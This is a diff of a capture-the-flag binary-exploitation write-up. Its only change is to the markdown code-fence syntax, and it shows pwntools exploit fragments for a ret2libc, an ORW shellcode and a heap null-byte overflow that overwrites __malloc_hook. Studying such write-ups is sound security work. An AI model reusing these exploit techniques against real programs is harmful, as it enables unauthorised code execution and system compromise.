@@ -29,7 +29,7 @@ ret = p64(0x0000000000401020)
 
 > 2.Leak libc using puts:
 
-```python=
+```python
 payload = flat(
     b"A" * offset,
     rdi,
@@ -47,7 +47,7 @@ log.success("puts@got" + hex(puts_got))
 
 >3.Calculate necessary addressess:
 
-```python=
+```python
 system = libc_base + libc.sym.system
 binsh = libc_base + next(libc.search(b"/bin/sh\x00"))
 ```
@@ -55,7 +55,7 @@ binsh = libc_base + next(libc.search(b"/bin/sh\x00"))
 >4. Sending last payload : 
 
 
-```python=
+```python
 final = flat(
     b"A"* offset,
     rdi,
@@ -70,7 +70,7 @@ p.interactive()
 ![](https://i.imgur.com/W3WGKaG.png)
 
 >Full Exploit : 
-```python=
+```python
 from pwn import * 
 context.update(arch='amd64',os='linux',log_level='debug')
 #p = process('./main')
@@ -118,7 +118,7 @@ a classic ret2shellcode challenge but with a little twist where you need to writ
     2.Send an ORW shellcode to read the flag file
 
 >1.Send a getdents shellcode : 
-```python=
+```python
 from pwn import * 
 context.update(arch='amd64', os='linux', log_level='debug')
 p = process('./main')
@@ -136,7 +136,7 @@ after sending the first payload we can notice the flag file name
 ![](https://i.imgur.com/zyxKfaF.png)
 
 We send the last payload to get the flag 
-```python=
+```python
 shell = asm(shellcraft.open('real_flag_file_txt.txt'))
 shell += asm(shellcraft.read(3, 'rsp', 0x100))
 shell += asm(shellcraft.write(1, 'rsp', 0x100))
@@ -147,7 +147,7 @@ payload = shell + b"A" * (offset - len(shell)) + p64(buf)
 
 >Full exploit : 
 
-```python=
+```python
 from pwn import * 
 context.update(arch='amd64', os='linux', log_level='debug')
 p = process('./main')
@@ -193,7 +193,7 @@ We notice that it reads until it reachs the provided size value then it just app
 
 first we create so function helpers to make it more reliable.
 
-```python=
+```python
 #!/usr/bin/env python3
 from pwn import *
 import time
@@ -224,7 +224,7 @@ def show(idx):
 
 So let's create some chunks and we will discuss our strategie.
 
-```python=
+```python
     alloc(0, 0xf8, "A"*0xf7)
     alloc(1, 0x68, "B"*0x67)
     alloc(2, 0xf8, "C"*0xf7)
@@ -238,7 +238,7 @@ so after those allocations our heap area should look like this
 
 the plan is going to abuse the null byte overflow by overwriting the ``prev_inuse`` bit from ``1`` to ``0`` to mark the previous chunk as a free chunk .
 while we are filling the chunk until we overwrite the prev in use bit we also will overwrite the ``prev_size`` field so we can get a chunk where we can have control over.
-```python=
+```python
     free(0)
     edit(1, b"A"*0x60 + p64(0x170))
     free(2)
@@ -255,7 +255,7 @@ Re-allocating idx 0 chunk with the same chunk size will push the libc addresses 
 
 >3.Compute necessary addressess:
 
-```python=
+```python
     hook = libc_base + (libc.sym["__malloc_hook"] - 0x23)
     one = libc_base + 0xf1247
 ```
@@ -263,7 +263,7 @@ we are going to overwrite the __malloc_hook we a one_gadget which can be obtaine
 
 >4.Overwrite __malloc_hook with one_gadget:
 
-```python=
+```python
     alloc(4,0x68, "A"*0x10)
     free(1)
     payload = b"A" * 0x13 + p64(one) * 2
@@ -282,7 +282,7 @@ last step will be triggering a malloc call which is done by just creating a rand
 ![](https://i.imgur.com/qwTtpI4.png)
 
 > Full exploit : 
-```python=
+```python
 #!/usr/bin/env python3
 from pwn import *
 import time
